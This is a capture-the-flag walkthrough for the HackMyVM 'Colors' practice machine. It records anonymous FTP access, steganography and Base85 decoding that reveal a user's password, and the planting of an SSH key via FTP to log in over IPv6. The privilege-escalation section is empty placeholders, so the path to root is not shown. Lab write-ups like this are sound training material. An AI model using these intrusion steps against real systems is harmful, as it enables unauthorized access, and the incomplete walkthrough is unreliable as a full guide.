# CTF Penetration Testing

## HackMyVM

### Colors - Machine

#### Machine Description

- Machine name: [Colors](https://hackmyvm.eu/machines/machine.php?vm=Colors)
- Machine type: Linux VM <img src="https://hackmyvm.eu/img/linux.png" alt="Linux" width="20"/>
- Machine difficulty: 🟨 Medium

<img src="https://hackmyvm.eu/img/vm/ez.png" alt="Colors Machine Logo" width="150"/>

> Hey hacker, I've heard a lot about you and I've been told you're good.
> 
> The FBI has hacked into my apache server and shut down my website. I need you to sneak in and retrieve the "root.txt" file. I left my credentials somewhere but I can't remember where.
> 
> I will pay you well if you succeed, good luck hacker.

#### Machine Writeup

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`ifconfig`:
```
docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:d5:98:e8:1c  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255
        ether 08:00:27:1e:36:4a  txqueuelen 1000  (Ethernet)
        RX packets 89846  bytes 133670439 (127.4 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 10045  bytes 606477 (592.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.56.118  netmask 255.255.255.0  broadcast 192.168.56.255 ←
        inet6 fe80::a50f:d743:435d:299a  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:9d:2e:ba  txqueuelen 1000  (Ethernet)
        RX packets 9  bytes 4816 (4.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 29  bytes 4577 (4.4 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 8  bytes 480 (480.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 8  bytes 480 (480.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

`fping -a -g 192.168.56.0/24 2> /dev/null`:
```
192.168.56.100
192.168.56.118
192.168.56.130 ←
```

`nmap -Pn -sSV -p- -T5 192.168.56.130`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-30 11:51 EDT
Nmap scan report for 192.168.56.130
Host is up (0.00079s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE    SERVICE VERSION
21/tcp open     ftp     vsftpd 3.0.3 ←
22/tcp filtered ssh ←
80/tcp open     http    Apache httpd 2.4.54 ((Debian)) ←
MAC Address: 08:00:27:BF:0D:E6 (Oracle VirtualBox virtual NIC)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.32 seconds
```

<div>
	<img src="C:\Users\nabla\Documents\Obsidian\vault-default\ctf_penetration_testing\hackmyvm\assets\logo_hacktricks.png" alt="HackTricks Logo" width="16" height="auto">
	<span style="color: red; font-size: 110%;"><strong>HackTricks</strong></span>
</div>
[Pentesting FTP](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp)
[**#Anonymous login**]
_anonymous : anonymous_ _anonymous :_ _ftp : ftp_
```
ftp <IP>
>anonymous
>anonymous
>ls -a # List all files (even hidden) (yes, they could be hidden)
>binary #Set transmission to binary instead of ascii
>ascii #Set transmission to ascii instead of binary
>bye #exit
```

`mkdir ./ftp_files && cd ./ftp_files`

`ftp 192.168.56.130`:
```                  
Connected to 192.168.56.130.
220 (vsFTPd 3.0.3)
Name (192.168.56.130:kali): anonymous ←
331 Please specify the password.
Password: ←
230 Login successful. ←
Remote system type is UNIX.
Using binary mode to transfer files.
```
```
ftp> dir
229 Entering Extended Passive Mode (|||26965|)
150 Here comes the directory listing.
-rw-r--r--    1 1127     1127            0 Jan 27  2023 first
-rw-r--r--    1 1039     1039            0 Jan 27  2023 second
-rw-r--r--    1 0        0          290187 Feb 11  2023 secret.jpg ←
-rw-r--r--    1 1081     1081            0 Jan 27  2023 third
226 Directory send OK.
```
```
ftp> get secret.jpg ←
local: secret.jpg remote: secret.jpg
229 Entering Extended Passive Mode (|||44667|)
150 Opening BINARY mode data connection for secret.jpg (290187 bytes).
100% |************************************************************************************************************************************************|   283 KiB   22.43 MiB/s    00:00 ETA
226 Transfer complete.
290187 bytes received in 00:00 (20.09 MiB/s)
ftp> exit
221 Goodbye.
```

`file ./secret.jpg`:
```
./secret.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 735x588, components 3
```

`stegseek ./secret.jpg`:
``` 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "Nevermind" ←
[i] Original filename: "more_secret.txt". ←
[i] Extracting to "secret.jpg.out". ←
```

`mv ./secret.jpg.out ./more_secret.txt`
`cat ./more_secret.txt`:
```
<-MnkFEo!SARTV#+D,Y4D'3_7G9D0LFWbmBCht5'AKYi.Eb-A(Bld^%E,TH.FCeu*@X0)<BOr<.BPD?sF!,R<@<<W;Dfm15Bk2*/F<G+4+EV:*DBND6+EV:.+E)./F!,aHFWb4/A0>E$/g+)2+EV:;Dg*=BAnE0-BOr;qDg-#3DImlA+B)]_C`m/1@<iu-Ec5e;FD,5.F(&Zl+D>2(@W-9>+@BRZ@q[!,BOr<.Ea`Ki+EqO;A9/l-DBO4CF`JUG@;0P!/g*T-E,9H5AM,)nEb/Zr/g*PrF(9-3ATBC1E+s3*3`'O.CG^*/BkJ\:
```

`https://cyberchef.org/#recipe=From_Base85('!-u',true,'z')&input=PC1NbmtGRW8hU0FSVFYjK0QsWTREJzNfN0c5RDBMRldibUJDaHQ1J0FLWWkuRWItQShCbGReJUUsVEguRkNldSpAWDApPEJPcjwuQlBEP3NGISxSPEA8PFc7RGZtMTVCazIqL0Y8Rys0K0VWOipEQk5ENitFVjouK0UpLi9GISxhSEZXYjQvQTA%2BRSQvZyspMitFVjo7RGcqPUJBbkUwLUJPcjtxRGctIzNESW1sQStCKV1fQ2BtLzFAPGl1LUVjNWU7RkQsNS5GKCZabCtEPjIoQFctOT4rQEJSWkBxWyEsQk9yPC5FYWBLaStFcU87QTkvbC1EQk80Q0ZgSlVHQDswUCEvZypULUUsOUg1QU0sKW5FYi9aci9nKlByRig5LTNBVEJDMUUrczMqM2AnTy5DR14qL0JrSlw6`
`CyberChef Input`:
```
<-MnkFEo!SARTV#+D,Y4D'3_7G9D0LFWbmBCht5'AKYi.Eb-A(Bld^%E,TH.FCeu*@X0)<BOr<.BPD?sF!,R<@<<W;Dfm15Bk2*/F<G+4+EV:*DBND6+EV:.+E)./F!,aHFWb4/A0>E$/g+)2+EV:;Dg*=BAnE0-BOr;qDg-#3DImlA+B)]_C`m/1@<iu-Ec5e;FD,5.F(&Zl+D>2(@W-9>+@BRZ@q[!,BOr<.Ea`Ki+EqO;A9/l-DBO4CF`JUG@;0P!/g*T-E,9H5AM,)nEb/Zr/g*PrF(9-3ATBC1E+s3*3`'O.CG^*/BkJ\:
```
`CyberChef Output`:
```
Twenty years from now you will be more disappointed by the things that you didn't do than by the ones you did do. So throw off the bowlines. Sail away from the safe harbor. Catch the trade winds in your sails. Explore. Dream. Discover.
pink:Pink4sPig$$ ←
```

`ftp 192.168.56.130`:
```  
Connected to 192.168.56.130.
220 (vsFTPd 3.0.3)
Name (192.168.56.130:kali): pink ←
331 Please specify the password.
Password: ←
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```
```
ftp> dir
229 Entering Extended Passive Mode (|||40827|)
150 Here comes the directory listing.
drwx------    2 1127     1127         4096 Feb 11  2023 green
drwx------    3 1000     1000         4096 Feb 11  2023 pink ←
drwx------    2 1081     1081         4096 Feb 20  2023 purple
drwx------    2 1039     1039         4096 Feb 11  2023 red
226 Directory send OK.
```
```
ftp> cd pink ←
250 Directory successfully changed.
ftp> ls -la
229 Entering Extended Passive Mode (|||32813|)
150 Here comes the directory listing.
drwx------    3 1000     1000         4096 Feb 11  2023 .
drwxr-xr-x    6 0        0            4096 Jan 27  2023 ..
lrwxrwxrwx    1 1000     1000            9 Jan 27  2023 .bash_history -> /dev/null
-rwx------    1 1000     1000          220 Jan 27  2023 .bash_logout
-rwx------    1 1000     1000         3526 Jan 27  2023 .bashrc
-rwx------    1 1000     1000          807 Jan 27  2023 .profile
drwx------    2 1000     1000         4096 Feb 11  2023 .ssh ←
-rwx------    1 1000     1000         3705 Feb 11  2023 .viminfo
-rw-r--r--    1 1000     1000           23 Feb 11  2023 note.txt ←
226 Directory send OK.
```
```
ftp> get note.txt
local: note.txt remote: note.txt
229 Entering Extended Passive Mode (|||20566|)
150 Opening BINARY mode data connection for note.txt (23 bytes).
100% |************************************************************************************************************************************************|    23        1.21 MiB/s    00:00 ETA
226 Transfer complete.
23 bytes received in 00:00 (15.05 KiB/s)
```
```
ftp> cd .ssh
250 Directory successfully changed.
ftp> ls -la
229 Entering Extended Passive Mode (|||33021|)
150 Here comes the directory listing.
drwx------    2 1000     1000         4096 Feb 11  2023 .
drwx------    3 1000     1000         4096 Feb 11  2023 ..
226 Directory send OK.
ftp> exit
221 Goodbye.
```

`cat ./note.txt`:
```
nothing to see here...
```

`ssh-keygen -t rsa -b 4096 -f ./pink_rsa`:
```
Generating public/private rsa key pair. ←
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in ./pink_rsa
Your public key has been saved in ./pink_rsa.pub
The key fingerprint is:
SHA256:T0qQW1prWPJm/tiO7wOOAoLwy/+gjhknk9cD5HvAX7I kali@kali-vm
The key's randomart image is:
+---[RSA 4096]----+
|                 |
|       .         |
|  .   + +        |
|.+     @ .       |
|o.= . = S .      |
|o.o* + *.+       |
|=o+oE  oo..      |
| Ooo.o. .=.      |
|o.o..o. o+*.     |
+----[SHA256]-----+
```

`ls -alps ./`:
```
total 308
  4 drwxrwxr-x 2 kali kali   4096 Sep 30 12:54 ./
  4 drwxrwxr-x 3 kali kali   4096 Sep 30 12:54 ../
  4 -rw-rw-r-- 1 kali kali    316 Sep 30 12:08 more_secret.txt
  4 -rw-r--r-- 1 kali kali     23 Feb 11  2023 note.txt
  4 -rw------- 1 kali kali   3381 Sep 30 12:51 pink_rsa
  4 -rw-r--r-- 1 kali kali    738 Sep 30 12:51 pink_rsa.pub ←
284 -rw-r--r-- 1 kali kali 290187 Feb 11  2023 secret.jpg
```

`ftp 192.168.56.130`:
```  
Connected to 192.168.56.130.
220 (vsFTPd 3.0.3)
Name (192.168.56.130:kali): pink ←
331 Please specify the password.
Password: ←
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```
```
ftp> cd pink
250 Directory successfully changed.
ftp> cd .ssh
250 Directory successfully changed.
ftp> put pink_rsa.pub authorized_keys ←
local: pink_rsa.pub remote: authorized_keys
229 Entering Extended Passive Mode (|||44875|)
150 Ok to send data.
100% |************************************************************************************************************************************************|   738        2.81 MiB/s    00:00 ETA
226 Transfer complete.
738 bytes sent in 00:00 (369.21 KiB/s)
ftp> ls -la
229 Entering Extended Passive Mode (|||15813|)
150 Here comes the directory listing.
drwx------    2 1000     1000         4096 Sep 30 18:56 .
drwx------    3 1000     1000         4096 Feb 11  2023 ..
-rw-------    1 1000     1000          738 Sep 30 18:56 authorized_keys ←
226 Directory send OK.
ftp> exit
221 Goodbye.
```

`ssh -i ./pink_rsa pink@192.168.56.130`:
```
ssh: connect to host 192.168.56.130 port 22: Connection refused ←
```

<div>
	<img src="C:\Users\nabla\Documents\Obsidian\vault-default\ctf_penetration_testing\hackmyvm\assets\logo_hacktricks.png" alt="HackTricks Logo" width="16" height="auto">
	<span style="color: red; font-size: 110%;"><strong>HackTricks</strong></span>
</div>
[Pentesting IPv6](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network/pentesting-ipv6)
[**#Networks**]
IPv6 addresses are structured to enhance network organization and device interaction. An IPv6 address is divided into:
1. **Network Prefix**: The initial 48 bits, determining the network segment.
2. **Subnet ID**: Following 16 bits, used for defining specific subnets within the network.
3. **Interface Identifier**: The concluding 64 bits, uniquely identifying a device within the subnet.
While IPv6 omits the ARP protocol found in IPv4, it introduces **ICMPv6** with two primary messages:
- **Neighbor Solicitation (NS)**: Multicast messages for address resolution.
- **Neighbor Advertisement (NA)**: Unicast responses to NS or spontaneous announcements.
IPv6 also incorporates special address types:
- **Loopback Address (**`**::1**`**)**: Equivalent to IPv4's `127.0.0.1`, for internal communication within the host.
- **Link-Local Addresses (**`**FE80::/10**`**)**: For local network activities, not for internet routing. Devices on the same local network can discover each other using this range.
**Practical Usage of IPv6 in Network Commands**
To interact with IPv6 networks, you can use various commands:
- **Ping Link-Local Addresses**: Check the presence of local devices using `ping6`.
- **Neighbor Discovery**: Use `ip neigh` to view devices discovered at the link layer.
- **alive6**: An alternative tool for discovering devices on the same network.
Below are some command examples:
```
ping6 –I eth0 -c 5 ff02::1 > /dev/null 2>&1
ip neigh | grep ^fe80

# Alternatively, use alive6 for neighbor discovery
alive6 eth0
```

`ping6 -I eth1 -c 3 -n ff02::1`:
```
ping6: Warning: IPv6 link-local address on ICMP datagram socket may require ifname or scope-id => use: address%<ifname|scope-id>
ping6: Warning: source address might be selected on device other than: eth1
PING ff02::1 (ff02::1) from :: eth1: 56 data bytes
64 bytes from fe80::a50f:d743:435d:299a%eth1: icmp_seq=1 ttl=64 time=0.283 ms
64 bytes from fe80::a00:27ff:febf:de6%eth1: icmp_seq=1 ttl=64 time=0.756 ms ←
64 bytes from fe80::a50f:d743:435d:299a%eth1: icmp_seq=2 ttl=64 time=0.025 ms
64 bytes from fe80::a00:27ff:febf:de6%eth1: icmp_seq=2 ttl=64 time=0.793 ms
64 bytes from fe80::a50f:d743:435d:299a%eth1: icmp_seq=3 ttl=64 time=0.024 ms

--- ff02::1 ping statistics ---
3 packets transmitted, 3 received, +2 duplicates, 0% packet loss, time 2040ms
rtt min/avg/max/mdev = 0.024/0.376/0.793/0.338 ms ←
```

`ifconfig eth1`:
```
eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.56.118  netmask 255.255.255.0  broadcast 192.168.56.255
        inet6 fe80::a50f:d743:435d:299a  prefixlen 64  scopeid 0x20<link> ←
        ether 08:00:27:9d:2e:ba  txqueuelen 1000  (Ethernet)
        RX packets 2444104  bytes 525026978 (500.7 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1388366  bytes 209142208 (199.4 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

`nmap -6 -Pn -sSV -p- -T5 fe80::a00:27ff:febf:de6%eth1`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-30 13:11 EDT
Nmap scan report for fe80::a00:27ff:febf:de6
Host is up (0.00065s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) ←
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
MAC Address: 08:00:27:BF:0D:E6 (Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.83 seconds
```

`ssh -6 -i ./pink_rsa pink@fe80::a00:27ff:febf:de6%eth1`:
```
Linux color 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Sep 30 19:12:05 2024 from fe80::a50f:d743:435d:299a%enp0s3
```

![Victim: pink](https://img.shields.io/badge/Victim-pink-64b5f6?logo=linux&logoColor=white)

`whoami`:
```
pink ←
```

`uname -a`:
```
Linux color 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64 GNU/Linux
```

`lsb_release -a`:
```
No LSB modules are available.
Distributor ID: Debian
Description:    Debian GNU/Linux 11 (bullseye)
Release:        11
Codename:       bullseye
```

`cd /home/pink`
`ls -alps ./`:
```
total 32
4 drwx------ 3 pink pink 4096 Feb 11  2023 ./
4 drwxr-xr-x 6 root root 4096 Jan 27  2023 ../
0 lrwxrwxrwx 1 pink pink    9 Jan 27  2023 .bash_history -> /dev/null
4 -rwx------ 1 pink pink  220 Jan 27  2023 .bash_logout
4 -rwx------ 1 pink pink 3526 Jan 27  2023 .bashrc
4 -rw-r--r-- 1 pink pink   23 Feb 11  2023 note.txt
4 -rwx------ 1 pink pink  807 Jan 27  2023 .profile
4 drwx------ 2 pink pink 4096 Sep 30 18:56 .ssh/
4 -rwx------ 1 pink pink 3705 Feb 11  2023 .viminfo
```

``:
```

```

``:
```

```


``:
```

```

``:
```

```

``:
```

```

``:
```

```

``:
```

```

``:
```

```

``:
```

```

``:
```

```

``:
```

```

``:
```

```

``:
```

```

``:
```

```

``:
```

```

``:
```

```

``:
```

```

``:
```

```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

``:
```

```

``:
```

```

``:
```

```

``:
```

```

![Victim: root](https://img.shields.io/badge/Victim-root-64b5f6?logo=linux&logoColor=white)

`python3 -c 'import pty; pty.spawn("/bin/bash")' && stty raw -echo && fg; export TERM=xterm; stty rows $(tput lines) cols $(tput cols)`

`whoami`:
```
root ←
```

`id`:
```
uid=0(root) gid=0(root) grupos=0(root) ←
```

`cd /root`
`ls -alps`:
```

```

`cat ./root.txt`:
```
 ←
```

<img src="https://hackmyvm.eu/img/correctflag.png" alt="Machine Hacked!" width="150"/>

---
---
